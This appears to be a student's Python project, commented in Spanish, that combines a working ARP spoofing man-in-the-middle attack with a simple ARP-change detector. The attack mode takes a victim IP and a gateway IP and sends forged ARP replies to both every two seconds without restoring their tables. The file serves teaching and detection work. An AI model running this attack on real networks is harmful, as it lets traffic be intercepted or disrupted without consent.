
"""
Proyecto 14: Simulación y Detección de ARP Spoofing
Autor: Adrián Muñoz Saiz
Curso: 2º DAM
"""

import scapy.all as scapy
import time
import sys
import os
import datetime
import threading
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.live import Live
from rich.align import Align
from rich.text import Text
from rich import box


console = Console()


def guardar_log(evento, tipo="ALERTA"):
    """Guarda eventos de seguridad en un archivo de texto con formato forense."""
    try:
        with open("alertas.log", "a") as f:
            fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{fecha}] [{tipo}] {evento}\n")
    except Exception as e:
        console.print(f"[bold red][!] Error E/S en log: {e}[/bold red]")


def get_mac(ip):
    """Resuelve la MAC mediante ARP Request."""
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]
        return answered_list[0][1].hwsrc if answered_list else None
    except Exception:
        return None

def spoof(target_ip, spoof_ip, target_mac):
    """Inyecta un paquete ARP Reply falsificado."""
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

def modo_simulacion():
    """Interfaz dinámica y ejecución del ataque Man-in-the-Middle."""
    console.clear()
    console.print(Panel(Align.center("[bold red]⚡ MÓDULO OFENSIVO: ARP SPOOFING ⚡[/bold red]"), box=box.DOUBLE_EDGE, style="red"))
    
    target_ip = Prompt.ask("[bold green]➜ Introduce la IP de la Víctima[/bold green]")
    gateway_ip = Prompt.ask("[bold green]➜ Introduce la IP del Gateway[/bold green]")
    
    console.print("[yellow][*] Resolviendo direcciones MAC físicas...[/yellow]")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        console.print(Panel("[bold white]Error CRÍTICO:[/bold white] No se encontraron los hosts en la red.", style="red", expand=False))
        return

    sent_packets = 0
    start_time = datetime.datetime.now()

   
    def generate_attack_table():
        table = Table(title="Panel de Control de Ataque", box=box.MINIMAL_DOUBLE_HEAD)
        table.add_column("Métrica", justify="left", style="cyan", no_wrap=True)
        table.add_column("Estado/Valor", justify="right", style="magenta")
        
        uptime = str(datetime.datetime.now() - start_time).split('.')[0]
        table.add_row("Estado", "[blink bold green]EN EJECUCIÓN[/blink bold green]")
        table.add_row("IP Víctima", f"{target_ip} ({target_mac})")
        table.add_row("IP Gateway", f"{gateway_ip} ({gateway_mac})")
        table.add_row("Tiempo Activo", uptime)
        table.add_row("Paquetes Inyectados", f"[bold yellow]{sent_packets}[/bold yellow]")
        return table

    console.print("\n[bold dim]Presiona Ctrl+C para abortar la inyección...[/bold dim]")
    
    try:
       
        with Live(generate_attack_table(), refresh_per_second=2) as live:
            while True:
                spoof(target_ip, gateway_ip, target_mac)
                spoof(gateway_ip, target_ip, gateway_mac)
                sent_packets += 2
                live.update(generate_attack_table())
                time.sleep(2)
                
    except KeyboardInterrupt:
        console.print("\n[bold red][!] Señal SIGINT recibida. Abortando inyección...[/bold red]")
        guardar_log(f"Ataque detenido. Víctima: {target_ip}, Paquetes: {sent_packets}", "INFO")


known_devices = {}
alert_counter = 0

def process_sniffed_packet(packet):
    """Evalúa la integridad ARP en tiempo real."""
    global alert_counter
    if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
        ip_src = packet[scapy.ARP].psrc
        mac_src = packet[scapy.ARP].hwsrc
        
        if ip_src not in known_devices:
            known_devices[ip_src] = mac_src
            console.print(f"[dim green]✓ Dispositivo aprendido:[/dim green] {ip_src} -> {mac_src}")
            
        elif known_devices[ip_src] != mac_src:
            alert_counter += 1
         
            alert_table = Table(show_header=False, box=box.SIMPLE_HEAVY, border_style="red")
            alert_table.add_column("Campo", style="bold white")
            alert_table.add_column("Dato", style="bold yellow")
            alert_table.add_row("Host Comprometido (IP)", ip_src)
            alert_table.add_row("MAC Legítima (Memoria)", known_devices[ip_src])
            alert_table.add_row("MAC Maliciosa (Atacante)", f"[bold red]{mac_src}[/bold red]")
            
            console.print(Panel(alert_table, title=f" INTRUSIÓN DETECTADA #{alert_counter} ", border_style="red"))
            
           
            guardar_log(f"Spoofing detectado en {ip_src}. MAC Original: {known_devices[ip_src]} | MAC Falsa: {mac_src}")

def modo_deteccion():
    """Arranca el sniffer de red."""
    console.clear()
    console.print(Panel(Align.center("[bold cyan] MÓDULO DEFENSIVO[/bold cyan]"), box=box.DOUBLE_EDGE, style="cyan"))
    console.print("[italic]Capturando y analizando tramas a nivel de enlace... Presiona Ctrl+C para salir.[/italic]\n")
    
    known_devices.clear() 
    try:
        scapy.sniff(store=False, prn=process_sniffed_packet, filter="arp")
    except KeyboardInterrupt:
        console.print(f"\n[bold yellow][!] Monitorización finalizada. Alertas totales: {alert_counter}[/bold yellow]")


def mostrar_banner():
    banner = """[bold blue]
    █████╗ ██████╗ ██████╗     
   ██╔══██╗██╔══██╗██╔══██╗    
   ███████║██████╔╝██████╔╝    
   ██╔══██║██╔══██╗██╔═══╝     
   ██║  ██║██║  ██║██║        
   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         
   [white]Autor: Adrián Muñoz Saiz[/white]
    [/bold blue]"""
    console.print(Align.center(banner))

def main():
    if os.geteuid() != 0:
        console.print(Panel("[bold red]ACCESO DENEGADO:[/bold red] Se requieren privilegios de superusuario (root) para acceder a los sockets de red.", style="red", expand=False))
        sys.exit(1)

    while True:
        console.clear()
        mostrar_banner()
        
        menu = Table(box=box.SIMPLE, show_header=False)
        menu.add_column("Opt", style="bold cyan")
        menu.add_column("Desc", style="white")
        menu.add_row("[1]", "Lanzar Ataque (Simulación ARP Spoofing)")
        menu.add_row("[2]", "Activar Escudos (IDS Monitor)")
        menu.add_row("[3]", "Salir del Sistema")
        
        console.print(Align.center(menu))
        
        opcion = Prompt.ask("\n[bold]Ejecutar módulo[/bold]", choices=["1", "2", "3"])
        
        if opcion == "1":
            modo_simulacion()
            Prompt.ask("\n[dim]Presiona Enter para volver a la terminal principal...[/dim]")
        elif opcion == "2":
            modo_deteccion()
            Prompt.ask("\n[dim]Presiona Enter para volver a la terminal principal...[/dim]")
        elif opcion == "3":
            if Confirm.ask("¿Estás seguro de que deseas salir?"):
                console.print("[bold green]Desconectando...[/bold green]")
                break

if __name__ == "__main__":
    main()